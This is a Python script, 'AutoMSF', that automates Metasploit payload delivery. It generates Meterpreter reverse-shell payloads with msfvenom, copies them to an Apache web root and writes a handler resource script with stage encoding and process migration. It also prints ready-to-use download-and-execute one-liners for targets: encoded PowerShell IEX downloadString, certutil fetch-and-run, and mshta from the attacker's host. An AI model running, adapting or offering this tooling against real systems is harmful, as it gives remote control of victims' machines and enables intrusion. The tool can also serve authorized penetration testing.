#!/usr/bin/env python3
import os
import sys
import base64
import subprocess
import shutil
import socket
import fcntl
import struct
import argparse
import random
import string
import platform
from datetime import datetime

# Banner with creator information
def print_banner():
    banner = r'''
    █████╗ ██╗   ██╗████████╗ ██████╗ ███╗   ███╗███████╗███████╗
   ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗████╗ ████║██╔════╝██╔════╝
   ███████║██║   ██║   ██║   ██║   ██║██╔████╔██║███████╗█████╗  
   ██╔══██║██║   ██║   ██║   ██║   ██║██║╚██╔╝██║╚════██║██╔══╝  
   ██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║██║     
   ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝     
                                                           v2.0
    Created by: Ivan Spiridonov (xbz0n)
    Website: https://xbz0n.sh
    '''
    print(banner)
    print(f"[*] Current Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Platform: {platform.system()} {platform.release()}")
    print(f"[*] Python Version: {platform.python_version()}")
    print("=" * 70)

# Function to get the IP address of the provided network interface
def get_ip_address(ifname):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', ifname[:15].encode('utf-8'))
        )[20:24])
    except:
        print(f"[!] Warning: Could not get IP for interface {ifname}")
        return None

# Generate a random string for file naming
def random_string(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def check_dependencies():
    print("[*] Checking dependencies...")
    
    # Check if msfvenom exists
    if shutil.which("msfvenom") is None:
        print("[!] Error: msfvenom not found. Please install Metasploit Framework.")
        sys.exit(1)
    else:
        print("[+] Metasploit Framework found")
    
    # Check if Apache is running
    try:
        with open("/var/run/apache2/apache2.pid", "r") as f:
            pid = f.read().strip()
            if pid:
                print("[+] Apache web server is running")
    except:
        print("[!] Warning: Apache web server might not be running")
    
    # Check if web directory exists
    if not os.path.isdir("/var/www/html"):
        print("[!] Warning: Web directory /var/www/html not found")
    else:
        print("[+] Web directory exists")

def generate_payloads(lhost, lport, payload_type, format_types, obfuscate, output_dir):
    payloads = []
    
    print(f"[*] Generating {payload_type} payloads...")
    
    # Ensure output directory exists
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    # Generate random prefix for filenames
    prefix = random_string() if obfuscate else "payload"
    
    for fmt in format_types:
        output_file = f"{output_dir}/{prefix}_{fmt.split('-')[0]}"
        
        if fmt == "csharp":
            output_file += ".cs"
        elif fmt == "exe":
            output_file += ".exe"
        elif fmt == "vbapplication":
            output_file += ".vbs"
        elif fmt == "psh":
            output_file += ".ps1"
        elif fmt == "hta":
            output_file += ".hta"
        elif fmt == "java":
            output_file += ".java"
        else:
            output_file += f".{fmt}"
        
        # Build the msfvenom command
        command = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f {fmt} -o {output_file}"
        
        print(f"[*] Executing: {command}")
        
        # Execute the command
        process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if process.returncode == 0:
            print(f"[+] Generated {output_file}")
            # Copy to web directory
            try:
                shutil.copy(output_file, "/var/www/html/")
                print(f"[+] Copied {output_file} to web server directory")
                payloads.append((os.path.basename(output_file), fmt))
            except:
                print(f"[!] Failed to copy {output_file} to web server directory")
        else:
            print(f"[!] Failed to generate {fmt} payload: {process.stderr.decode()}")
    
    return payloads

def generate_resource_script(lhost, lport, payload_type, output_dir):
    rc_file = f"{output_dir}/handler.rc"
    
    content = f"""use exploit/multi/handler
set payload {payload_type}
set LHOST {lhost}
set LPORT {lport}
set exitfunc thread
set EnableStageEncoding true
set StageEncoder x64/xor
set AutoRunScript post/windows/manage/smart_migrate
set ExitOnSession false
run -j
"""
    
    with open(rc_file, 'w') as f:
        f.write(content)
    
    print(f"[+] Created Metasploit handler script: {rc_file}")
    return rc_file

def generate_download_commands(lhost, lport, payloads):
    commands = []
    
    print("\n[*] Generating download and execution commands...")
    
    for filename, fmt in payloads:
        if fmt == "psh" or fmt == "powershell":
            # PowerShell download and execute
            ps_cmd = f"IEX(New-Object Net.WebClient).downloadString('http://{lhost}/{filename}')"
            encoded_cmd = subprocess.check_output(f'echo -n "{ps_cmd}" | iconv -t UTF-16LE | base64 -w 0', shell=True).decode().strip()
            commands.append((f"PS1 ({filename}):", f"powershell -nop -enc {encoded_cmd}"))
            
            # PowerShell download to disk
            ps_disk = f"(New-Object Net.WebClient).DownloadFile('http://{lhost}/{filename}', '$env:TEMP\\{filename}'); Start-Process '$env:TEMP\\{filename}'"
            encoded_disk = subprocess.check_output(f'echo -n "{ps_disk}" | iconv -t UTF-16LE | base64 -w 0', shell=True).decode().strip()
            commands.append((f"PS1 (download to disk):", f"powershell -nop -enc {encoded_disk}"))
            
        elif fmt == "exe":
            # Direct download with certutil
            certutil_cmd = f"certutil -urlcache -split -f http://{lhost}/{filename} %TEMP%\\{filename} && %TEMP%\\{filename}"
            commands.append((f"EXE (certutil):", certutil_cmd))
            
            # Wget equivalent for Windows
            wget_cmd = f"powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://{lhost}/{filename}', '%TEMP%\\{filename}'); Start-Process '%TEMP%\\{filename}'\""
            commands.append((f"EXE (powershell):", wget_cmd))
            
        elif fmt == "vbapplication":
            vbs_cmd = f"cscript //nologo %TEMP%\\{filename}"
            dl_cmd = f"certutil -urlcache -split -f http://{lhost}/{filename} %TEMP%\\{filename} && {vbs_cmd}"
            commands.append((f"VBS:", dl_cmd))
            
        elif fmt == "hta":
            hta_cmd = f"mshta http://{lhost}/{filename}"
            commands.append((f"HTA:", hta_cmd))
            
    return commands

def main():
    print_banner()
    
    # Set up command line argument parsing
    parser = argparse.ArgumentParser(description='AutoMSF - Automated Metasploit Payload Generator')
    parser.add_argument('LHOST', help='IP address for reverse connection')
    parser.add_argument('LPORT', help='Port for reverse connection')
    parser.add_argument('--interface', '-i', help='Network interface to use for IP detection (e.g., tun0, eth0)')
    parser.add_argument('--payload', '-p', choices=['windows/x64/meterpreter/reverse_https', 
                                                  'windows/x64/meterpreter/reverse_tcp',
                                                  'windows/meterpreter/reverse_https',
                                                  'windows/meterpreter/reverse_tcp',
                                                  'linux/x64/meterpreter/reverse_tcp',
                                                  'linux/x86/meterpreter/reverse_tcp'],
                       default='windows/x64/meterpreter/reverse_https',
                       help='Payload type to generate')
    parser.add_argument('--formats', '-f', nargs='+', 
                      choices=['exe', 'psh', 'vbapplication', 'csharp', 'hta', 'java', 'python', 'jsp'],
                      default=['exe', 'psh', 'vbapplication', 'csharp'],
                      help='Output formats to generate')
    parser.add_argument('--output-dir', '-o', default='./payloads',
                      help='Directory to save generated payloads')
    parser.add_argument('--start-handler', '-s', action='store_true',
                      help='Start Metasploit handler after generating payloads')
    parser.add_argument('--obfuscate', '-b', action='store_true',
                      help='Obfuscate filenames with random strings')
    parser.add_argument('--check', '-c', action='store_true',
                      help='Check dependencies and exit')
    
    args = parser.parse_args()
    
    # Check dependencies only if requested
    check_dependencies()
    if args.check:
        sys.exit(0)
    
    # Use interface IP if provided
    lhost = args.LHOST
    if args.interface:
        interface_ip = get_ip_address(args.interface)
        if interface_ip:
            print(f"[*] Detected IP for {args.interface}: {interface_ip}")
            lhost = interface_ip
    
    print(f"[*] Using LHOST={lhost}, LPORT={args.LPORT}")
    
    # Generate the payloads
    payloads = generate_payloads(lhost, args.LPORT, args.payload, args.formats, args.obfuscate, args.output_dir)
    
    # Generate resource script
    rc_file = generate_resource_script(lhost, args.LPORT, args.payload, args.output_dir)
    
    # Generate download commands
    commands = generate_download_commands(lhost, args.LPORT, payloads)
    
    # Print the download commands
    print("\n[*] Download and execution commands:")
    for description, command in commands:
        print(f"\n{description}\n{command}")
    
    print("\n[*] Start the Metasploit handler with:")
    print(f"msfconsole -q -r {rc_file}")
    
    # Start the handler if requested
    if args.start_handler:
        print("\n[*] Starting Metasploit handler...")
        os.system(f'msfconsole -q -r {rc_file}')

# Entry point of the script
if __name__ == '__main__':
    # Handle ArgumentParser's help output if no arguments are provided
    if len(sys.argv) == 1:
        main()
        sys.exit(0)
    else:
        main()

